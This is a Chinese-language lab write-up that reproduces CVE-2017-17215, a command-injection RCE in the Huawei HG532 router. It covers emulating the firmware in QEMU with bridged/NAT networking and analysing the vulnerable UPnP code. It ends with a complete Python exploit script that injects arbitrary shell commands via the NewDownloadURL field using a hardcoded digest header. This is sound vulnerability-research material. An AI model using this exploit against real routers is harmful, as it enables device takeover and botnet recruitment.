### 环境搭建

#### 网络环境

原作者的网络环境：

1. 创建一个br0作为二层的虚拟网桥，创建了一个虚拟网卡tap0，qemu使用这个网卡
2. 将tap0和ens33(物理网卡)桥接到br0上
3. 通过dhcp服务为tap0分配ip

但是由于qemu使用的MAC地址是未通过VMware注册的，在为tap0分配ip时，dhcp数据包被VMware拦截，这里不知道原作者怎么解决的

现在使用ubuntu做NAT加上端口转发来搭建网络

1. 配置工具

   ```
   apt-get install bridge-utils uml-utilities	# 安装配置工具
   sysctl -w net.ipv4.ip_forward=1			# 开启转发功能
   ```
2. 配置网络拓扑结构：原作者的ubuntu使用ifupdown管理网络接口，而我的ubuntu使用的是NetworkManager管理网络接口的

   ```
   删掉ens33连接，防止ens33被当成 L3 口，DHCP 抢 IP
   nmcli connection delete "Wired connection 1"

   创建 bridge（br0），并启用 DHCP
   nmcli connection add type bridge ifname br0 con-name br0 ipv4.method auto ipv6.method ignore

   把 ens33 加入 bridge
   nmcli connection add type ethernet ifname ens33 con-name br0-slave-ens33 master br0

   启动连接
   nmcli connection up br0
   nmcli connection up br0-slave-ens33
   ```
3. 配置qemu的网络环境，这里默认按原作者的来

   ```
   在qemu中，用nano /etc/network/interfaces命令修改其中内容为
   allow-hotplug eth1
   iface eth1 inet dhcp
   ```

   原文中重启网卡之后就可以得到ip，实际上由于VMware过滤未知MAC地址的数据包导致DHCP DISCOVER出不了VMware
4. NAT加端口转发

   ```
   1. qemu内配置
   ip addr add 192.168.192.10/24 dev eth1	# 分配ip
   ip link set eth1 up			# 启动网卡
   ip route add default via 192.168.192.1	# 配置路由

   2. ubuntu给br0加私网地址
   sudo ip addr add 192.168.192.1/24 dev br0

   3. 将tap0桥接到br0
   sudo ip tuntap add dev tap0 mode tap user $USER		# Ubuntu 上手动创建 tap0
   sudo ip link set tap0 up				# 启动
   sudo ip link set tap0 master br0			# 桥接

   4. NAT 出网
   sudo iptables -t nat -A POSTROUTING -s 192.168.192.0/24 -o br0 -j MASQUERADE	# 把 QEMU 出去的包伪装成 Ubuntu br0 的 IP

   sudo iptables -A FORWARD -s 192.168.192.0/24 -j ACCEPT
   sudo iptables -A FORWARD -d 192.168.192.0/24 -j ACCEPT				# FORWARD 放行（否则包会被内核丢）

   5. 做端口转发
   sudo iptables -t nat -A PREROUTING   -d 192.168.0.103 -p tcp --dport 5566  -j DNAT --to-destination 192.168.192.10:37215
   sudo iptables -A FORWARD -p tcp   -d 192.168.192.10 --dport 37215 -j ACCEPT
   ```

完成后拓扑图

```
        局域网网关 (192.168.0.1)
                   ↓
        Ubuntu 虚拟机 (ens33)
          IP: 192.168.0.103
                   ↓
                  br0
        (Linux Bridge，双地址)
        192.168.0.103 / 192.168.192.10
                   	      ↓
                            tap0
                   	      ↓
        		  QEMU 虚拟机 eth1
```

#### qemu启动

下载所需的内核镜像，所需的固件文件

```
https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2

https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta

https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp
```

1. 提取 `HG532eV100R001C02B015_upgrade_main.bin`固件

   ```
   安装binwalk：新版本还要安装Rust编译器，很麻烦，安装3.1以前的版本 
   安装sasquatch
   ```
2. 编辑qemu启动时的网络配置文件，由于我使用的是自己编译的qemu，所以在/usr/local/etc/下配置

   ```
   在/usr/local/etc/下创建qemu-ifup并写入
   #!/bin/sh
   echo "Executing /usr/local/etc/qemu-ifup"
   echo "Bringing up $1 for bridge mode..."
   sudo /sbin/ifconfig $1 0.0.0.0 promisc up
   echo "Adding $1 to br0..."
   sudo /sbin/brctl addif br0 $1
   sleep 2

   创建包含qemu使用的所有桥的名称的配置文件/etc/qemu/bridge.conf并写入
   allow br0
   ```
3. qemu启动脚本

   ```
   #!/bin/bash
   sudo qemu-system-mips \
       -M malta -kernel vmlinux-2.6.32-5-4kc-malta \
       -hda debian_squeeze_mips_standard.qcow2 \
       -append "root=/dev/sda1 console=ttyS0" \
       -net nic,macaddr=00:16:3e:00:00:01 \
       -net tap \
       -nographic
   ```

#### qemu中启动固件

1. 将固件传入到qemu中，debian自带wget，ubuntu用python起一个http服务，下载固件

   ```
   wget -r -np -nH --cut-dirs=0 -P ./ http://192.168.0.103:8888/squashfs-root/
   ```
2. 更换原始镜像文件的根目录为从固件中提取的文件系统的根目录

   ```
   cd squashfs-root
   chroot . sh
   ```
3. 运行 `/bin/mic`，upnp服务所在的文件

### 分析利用

#### 分析

该路由器实现了 TR-064 协议并在 WAN 侧暴露了管理接口TCP 37215，攻击者可通过 TR-064 触发与 UPnP 组件交互的功能路径，最终抵达 `/bin/upnp` 中存在的命令注入逻辑，从而在设备上实现远程代码执行（RCE）。

`/bin/mic` 负责 UPnP SSDP 服务的 socket 初始化与 inetd 式进程调度，在收到网络就绪消息后创建并监听 1900/UDP 多播端口，并将该 socket 绑定至 upnp 服务。当有 SSDP 请求到达时，mic 会按需启动 `/bin/upnp` 并将 socket 交由其处理，从而触发 upnp 内部存在的命令执行漏洞。

![](https://raw.githubusercontent.com/soskong/Image/main/Screenshot%202026-01-27%20185447.png)

`v4` 变量来自 `NewDownloadURL` 节点的值，

snprintf 用于格式化输出字符串，将字符串写入到v6，system(v6)造成任意命令执行

#### 利用

```
import requests

Authorization = "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
headers = {"Authorization": Authorization}

print("-----CVE-2017-17215 HUAWEI HG532 RCE-----\n")
cmd = input("command > ")

data = f'''
<?xml version="1.0" ?>
<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
            <NewStatusURL>winmt</NewStatusURL>
            <NewDownloadURL>;{cmd};</NewDownloadURL>
        </u:Upgrade>
    </s:Body>
</s:Envelope>
'''

r = requests.post('http://192.168.192.10:37215/ctrlt/DeviceUpgrade_1', headers = headers, data = data)
print("\nstatus_code: " + str(r.status_code))
print("\n" + r.text)
```

windows物理机

![img](https://raw.githubusercontent.com/soskong/Image/main/Screenshot%202026-01-27%20193050.png)

ubuntu中的qemu

![img](https://raw.githubusercontent.com/soskong/Image/main/Screenshot%202026-01-27%20193122.png)

### 参考

[一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone](https://www.iotsec-zone.com/article/384#%E5%8D%8E%E4%B8%BAhg532%E8%B7%AF%E7%94%B1%E5%99%A8rce%E6%BC%8F%E6%B4%9E)

[Huawei Home Routers in Botnet Recruitment - Check Point Research](https://research.checkpoint.com/2017/good-zero-day-skiddie/)

### 后

当NetworkManager服务未启动，nmcli管理接口失败，用ip命令

```
删除无效 br0 配置

sudo nmcli connection delete br0
sudo nmcli connection delete br0-slave-ens33

手动创建桥
sudo ip link add name br0 type bridge
sudo ip link set br0 up

把 ens33 加进去：
sudo ip addr flush dev ens33
sudo ip link set ens33 master br0

把 IP 给 br0：
sudo dhclient br0

桥接tap0
sudo ip link set tap0 master br0
```
